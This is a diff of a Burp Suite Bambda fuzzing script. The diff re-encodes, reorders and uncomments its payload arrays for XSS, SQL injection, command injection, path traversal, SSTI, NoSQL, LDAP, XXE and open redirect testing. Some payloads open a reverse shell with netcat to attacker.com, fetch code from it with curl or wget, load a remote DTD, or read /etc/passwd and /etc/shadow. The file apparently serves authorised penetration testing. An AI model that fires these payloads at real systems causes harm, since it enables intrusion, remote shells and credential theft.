@@ -5,7 +5,7 @@
 <summary><strong>Quick Fuzzer</strong></summary>
 
 ```
-// Save as fuzzer.bambda -> Repeater Tab -> Custom-Action
+// Save as fuzzer.bambda -> Repeater Tab -> Custom Action
 // This Bambda extracts all parameters and performs comprehensive fuzzing tests
 // Optionally fuzz cookie parameters
 // All requests are sent directly without creating new tabs, with detailed logging
@@ -47,12 +47,12 @@ int GLOBAL_DELAY_MS = 100;
 
 // Different Payloads for Different Attack Types, Add more as per requirement
 String[] SPECIAL_CHARS = {
-    "!@#$%^&*()",
+    "%23$%25^%26*()",
     "<>\"'",
     "[]{}|\\",
     "~`+=",
     ";:,./?",
-    "%$#@!^*()_+",
+    "%$%23%40!^*()_%2b",
     "\'\";:,.<>/?|{}[]",
     "\\\\\\\\",
     "--++==",
@@ -75,18 +75,18 @@ String[] XSS_PAYLOADS = {
     "<img+src=1+onerror=prompt(1)>",
     "<svg><script>alert(1)</script></svg>",
     "'\"><svg><animate+onbegin=alert('hacked')+attributeName=x></svg>",
-    "<a+href=javascript:alert('hacked')>Click Here</a>",
+    "<a+href=javascript:alert('hacked')>Click+Here</a>",
     "<IFRAME+SRC=\"javascript:alert('hacked');\"></IFRAME>",
-    "<div+ng-app>+<strong class=\"ng-init:constructor.constructor('alert('hacked')')()\">aaa</strong>+</div>",
+    "<div+ng-app>+<strong+class=\"ng-init:constructor.constructor('alert('hacked')')()\">aaa</strong>+</div>",
     "<<TexTArEa/*%00//%00*/a=\"not\"/*%00///AutOFocUs////onFoCUS=alert`hacked`+//",
-    "\"'<00 foo=\"<a%20href=\"iavascript :alert(\"XSS-Bypass')\">XSS-CLick</00>--%20/"
+    "\"'<00+foo=\"<a%20href=\"iavascript+:alert(\"XSS-Bypass')\">XSS-CLick</00>--%20/"
 };
 
 String[] SQLI_PAYLOADS = {
     "'+OR+'1'='1",
     "'",
     "\"",
-    "'+OR+1=1#",
+    "'+OR+1=1%23",
     "admin'--",
     "'+OR+'a'='a",
     "1'+OR+'1'='1'+/*",
@@ -100,166 +100,6 @@ String[] SQLI_PAYLOADS = {
     "'++OR+sleep(5)--",
     "'++OR+benchmark(1000000,MD5(1))--"
 };
-
-// Command Injection Payloads
-String[] COMMAND_INJECTION_PAYLOADS = {
-    ";+ls+-la",
-    "|+whoami",
-    "&+dir",
-    "`id`",
-    "$(whoami)",
-    ";+cat+/etc/passwd",
-    "&&+echo+vulnerable",
-    ";+ping+-c+1+127.0.0.1",
-    "|+type+C:\\Windows\\System32\\drivers\\etc\\hosts",
-    "$(ping+-c+1+127.0.0.1)",
-    "|+ls",
-    "&+whoami",
-    ";+id",
-    "|+cat+/etc/shadow",
-    "|+nc+-e+/bin/sh+attacker.com+4444",
-    "|+powershell+whoami",
-    "|+bash+-i",
-    "|+curl+http://attacker.com",
-    "|+wget+http://attacker.com"
-};
-
-// Path Traversal/Directory Traversal
-String[] PATH_TRAVERSAL_PAYLOADS = {
-    "../../../etc/passwd",
-    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-    "....//....//....//etc/passwd",
-    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-    "..%252f..%252f..%252fetc%252fpasswd",
-    "/etc/passwd%00",
-    "file:///etc/passwd",
-    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
-    "..%2f..%2f..%2fetc%2fshadow",
-    "..\\..\\..\\boot.ini",
-    "..%5c..%5c..%5cwindows%5cwin.ini",
-    "..%255c..%255c..%255cwindows%255cwin.ini",
-    "..%c1%1c..%c1%1c..%c1%1cwindows%5cwin.ini",
-    "..%c0%ae..%c0%ae..%c0%aeetc%c0%aepasswd",
-    "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd"
-};
-
-// LDAP Injection
-String[] LDAP_INJECTION_PAYLOADS = {
-    "*",
-    "*)(&",
-    "*))%00",
-    ")(cn=*",
-    //    "*)(uid=*",
-    //    "admin)(&(password=*))",
-    "*()|%26'",
-    "*%29%28%7C%28objectClass%3D*",
-    "*%28%7C%28objectClass%3D*",
-    "*%29%28uid%3D*",
-    "*%29%28mail%3D*",
-    "*%29%28password%3D*",
-    "*%29%28cn%3D*",
-    "*%29%28sn%3D*"
-};
-
-// NoSQL Injection
-String[] NOSQL_INJECTION_PAYLOADS = {
-    "true,+$where:+'1+==+1'",
-    ",+$where:+'1+==+1'",
-    "$ne=1",
-    "[$ne]=1",
-    //    "';+return+true;+var+dummy='",
-    //    "{\"$gt\":\"\"}",
-    //    "{\"$regex\":\".*\"}",
-    "{$ne:null}",
-    "{$gt: ''}",
-    "{$lt: ''}",
-    "{$in: [null, 1, 'a']}",
-    "'||1==1||'",
-    "'||a==a||'",
-    "admin' || '1'=='1"
-};
-
-// Server-Side Template Injection (SSTI)
-String[] SSTI_PAYLOADS = {
-    "{{7*7}}",
-    "${7*7}",
-    "#{7*7}",
-    "{{config}}",
-    "<%=7*7%>",
-    //    "${jndi:ldap://attacker.com/a}",
-    //    "{{request.application.__globals__}}",
-    "{{self}}",
-    "{{request}}",
-    "{{url_for.__globals__.__builtins__.open('/etc/passwd').read()}}",
-    "{{().__class__.__bases__[0].__subclasses__()}}",
-    "{{[].__class__.__mro__[2].__subclasses__()}}",
-    "${{7*'7'}}",
-    "<%={{7*7}}%>"
-};
-
-// Format String Vulnerabilities
-String[] FORMAT_STRING_PAYLOADS = {
-    "%s%s%s%s%s%s%s%s%s%s",
-    "%x%x%x%x%x%x%x%x%x%x",
-    "%n%n%n%n%n%n%n%n%n%n",
-    "%08x.%08x.%08x.%08x",
-    "AAAA%08x.%08x.%08x.%08x",
-    "%99999999999s",
-    "%99999999999d",
-    "%99999999999x",
-    "%99999999999n",
-    "%p %p %p %p %p",
-    "%#x",
-    "%#n"
-};
-
-// Email Validation Bypass
-String[] EMAIL_BYPASS_PAYLOADS = {
-    "test@test@test.com",
-    "test..test@test.com",
-    "test@",
-    "@test.com",
-    "test@test.",
-    "\"test\"@test.com",
-    "test@.com",
-    "test@com",
-    "test@-test.com",
-    "test@%31.com",
-    "test@sub..test.com",
-    "test@sub_test.com",
-    "test@sub+test.com"
-};
-
-// JSON Injection
-String[] JSON_INJECTION_PAYLOADS = {
-    "\",\"injected\":\"true\",\"a\":\"",
-    "\"}}],\"injected\":true,\"a\":[{\"b\":\"",
-    "\",\"admin\":true,\"test\":\"",
-    "\\\":\\\"\\\"}],\\\"injected\\\":true}",
-    "\",\"isAdmin\":true,\"foo\":\"",
-    "\",\"$ne\":null,\"foo\":\"",
-    "\",\"$gt\":\"\",\"foo\":\"",
-    "\",\"$or\":[{},{}],\"foo\":\"",
-    "\",\"$where\":\"1==1\",\"foo\":\""
-};
-
-// Business Logic Tests
-String[] BUSINESS_LOGIC_PAYLOADS = {
-    "0",
-    "-1",
-    "true",
-    "false",
-    "999999999",
-    "-999999999",
-    "0.00",
-    "-0.01",
-    "null",
-    "undefined",
-    "NaN",
-    "Infinity",
-    "-Infinity"
-};
-
 
 String[] INVALID_DATES = {
     "2024-13-01",
@@ -291,14 +131,173 @@ String[] INVALID_TIMES = {
     "99:99:99PM"
 };
 
+// Server-Side Template Injection (SSTI)
+String[] SSTI_PAYLOADS = {
+    "{{7*7}}",
+    "${7*7}",
+    "#{7*7}",
+    "{{config}}",
+    "<%=7*7%>",
+    "${jndi:ldap://attacker.com/a}",
+    "{{request.application.__globals__}}",
+    "{{self}}",
+    "{{request}}",
+    "{{url_for.__globals__.__builtins__.open('/etc/passwd').read()}}",
+    "{{().__class__.__bases__[0].__subclasses__()}}",
+    "{{[].__class__.__mro__[2].__subclasses__()}}",
+    "${{7*'7'}}",
+    "<%={{7*7}}%>"
+};
+
+// NoSQL Injection
+String[] NOSQL_INJECTION_PAYLOADS = {
+    "true,+$where:+'1+==+1'",
+    ",+$where:+'1+==+1'",
+    "$ne=1",
+    "[$ne]=1",
+    "';+return+true;+var+dummy='",
+    "{\"$gt\":\"\"}",
+    "{\"$regex\":\".*\"}",
+    "{$ne:null}",
+    "{$gt:%2b''}",
+    "{$lt:%2b''}",
+    "{$in:%2b[null,%2b1,%2b'a']}",
+    "'||1==1||'",
+    "'||a==a||'",
+    "admin'%2b||%2b'1'=='1"
+};
+
+// Path Traversal/Directory Traversal
+String[] PATH_TRAVERSAL_PAYLOADS = {
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "/etc/passwd%00",
+    "file:///etc/passwd",
+    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+    "..%2f..%2f..%2fetc%2fshadow",
+    "..\\..\\..\\boot.ini",
+    "..%5c..%5c..%5cwindows%5cwin.ini",
+    "..%255c..%255c..%255cwindows%255cwin.ini",
+    "..%c1%1c..%c1%1c..%c1%1cwindows%5cwin.ini",
+    "..%c0%ae..%c0%ae..%c0%aeetc%c0%aepasswd",
+    "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd"
+};
+
+// Command Injection Payloads
+String[] COMMAND_INJECTION_PAYLOADS = {
+    ";+ls+-la",
+    "|+whoami",
+    "%26%2bdir",
+    "`id`",
+    "$(whoami)",
+    ";+cat+/etc/passwd",
+    "%26%26%2becho%2bvulnerable",
+    ";+ping+-c+1+127.0.0.1",
+    "|+type+C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "$(ping+-c+1+127.0.0.1)",
+    "|+ls",
+    "%26%2bwhoami",
+    ";+id",
+    "|+cat+/etc/shadow",
+    "|+nc+-e+/bin/sh+attacker.com+4444",
+    "|+powershell+whoami",
+    "|+bash+-i",
+    "|+curl+http://attacker.com",
+    "|+wget+http://attacker.com"
+};
+
+// LDAP Injection
+String[] LDAP_INJECTION_PAYLOADS = {
+    "*",
+    "*)(%26",
+    "*))%00",
+    ")(cn=*",
+    "*)(uid=*",
+    "admin)(&(password=*))",
+    "*()|%26'",
+    "*%29%28%7C%28objectClass%3D*",
+    "*%28%7C%28objectClass%3D*",
+    "*%29%28uid%3D*",
+    "*%29%28mail%3D*",
+    "*%29%28password%3D*",
+    "*%29%28cn%3D*",
+    "*%29%28sn%3D*"
+};
+
+// JSON Injection
+String[] JSON_INJECTION_PAYLOADS = {
+    "\",\"injected\":\"true\",\"a\":\"",
+    "\"}}],\"injected\":true,\"a\":[{\"b\":\"",
+    "\",\"admin\":true,\"test\":\"",
+    "\\\":\\\"\\\"}],\\\"injected\\\":true}",
+    "\",\"isAdmin\":true,\"foo\":\"",
+    "\",\"$ne\":null,\"foo\":\"",
+    "\",\"$gt\":\"\",\"foo\":\"",
+    "\",\"$or\":[{},{}],\"foo\":\"",
+    "\",\"$where\":\"1==1\",\"foo\":\""
+};
+
+// Email Validation Bypass
+String[] EMAIL_BYPASS_PAYLOADS = {
+    "test@test@test.com",
+    "test..test@test.com",
+    "test@",
+    "@test.com",
+    "test@test.",
+    "\"test\"@test.com",
+    "test@.com",
+    "test@com",
+    "test@-test.com",
+    "test@%31.com",
+    "test@sub..test.com",
+    "test@sub_test.com",
+    "test@sub+test.com"
+};
+
+// Format String Vulnerabilities
+String[] FORMAT_STRING_PAYLOADS = {
+    "%s%s%s%s%s%s%s%s%s%s",
+    "%x%x%x%x%x%x%x%x%x%x",
+    "%n%n%n%n%n%n%n%n%n%n",
+    "%08x.%08x.%08x.%08x",
+    "AAAA%08x.%08x.%08x.%08x",
+    "%99999999999s",
+    "%99999999999d",
+    "%99999999999x",
+    "%99999999999n",
+    "%p%2b%p%2b%p%2b%p%2b%p",
+    "%%23x",
+    "%%23n"
+};
+
+// Business Logic Tests
+String[] BUSINESS_LOGIC_PAYLOADS = {
+    "0",
+    "-1",
+    "true",
+    "false",
+    "999999999",
+    "-999999999",
+    "0.00",
+    "-0.01",
+    "null",
+    "undefined",
+    "NaN",
+    "Infinity",
+    "-Infinity"
+};
+
 // XML/XXE Injection
 String[] XXE_PAYLOADS = {
-    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "<?xml+version="1.0"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+"file:///etc/passwd">]><foo>%26xxe%3b</foo>",
     "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///c:/windows/win.ini\">]>",
     "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+%+xxe+SYSTEM+\"http://attacker.com/evil.dtd\">%xxe;]>",
     "<!ENTITY+xxe+SYSTEM+\"expect://id\">",
     "<![CDATA[<script>alert('XXE')</script>]]>",
-    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
+    "<?xml+version=\"1.0\"?><!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///c:/boot.ini\">]><foo>%26xxe%3b</foo>",
     "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///etc/shadow\">]>",
     "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"file:///proc/self/environ\">]>",
     "<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+\"http://127.0.0.1:8080/evil.dtd\">]>",
@@ -338,7 +337,7 @@ String[] OPEN_REDIRECT_PAYLOADS = {
     "//0.0.0.0",
     "//[::1]",
     "//user:pass@evil.com",
-    "//evil.com#@google.com"
+    "//evil.com%23%40google.com"
 };
 
 // Unicode/Encoding Bypass
@@ -348,7 +347,7 @@ String[] UNICODE_BYPASS_PAYLOADS = {
     "%c0%3cscript%c0%3ealert('XSS')%c0%3c/script%c0%3e",
     "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
     "%e0%80%3cscript%e0%80%3e",
-    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
+    "%26%23x3C%3bscript%26%23x3E%3balert('XSS')%26%23x3C%3b/script%26%23x3E%3b",
     "%u003Cscript%u003Ealert('XSS')%u003C/script%u003E",
     "%u003Cimg+src=x+onerror=alert('XSS')%u003E",
     "%u003Csvg+onload=alert('XSS')%u003E",
@@ -670,7 +669,7 @@ for (burp.api.montoya.http.message.params.HttpParameter param: allParams) {
             int status = httpRequestResponse.response().statusCode();
             int responseLength = httpRequestResponse.response().body().length();
     
-    		String result = "INVALID DATE: '" + time;
+    		String result = "INVALID TIME: '" + time;
             logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");
 
             // set annotations
